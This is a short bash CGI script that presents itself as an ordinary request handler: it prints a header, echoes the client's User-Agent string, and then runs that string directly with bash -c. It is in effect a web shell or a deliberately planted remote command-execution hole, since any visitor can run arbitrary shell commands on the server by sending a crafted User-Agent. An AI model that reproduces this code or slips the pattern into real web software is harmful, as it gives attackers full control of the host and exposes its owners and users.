#!/bin/bash
echo "Content-type: text/plain"
echo
echo "Processing your request"
echo "User-Agent: $HTTP_USER_AGENT"
bash -c "$HTTP_USER_AGENT"
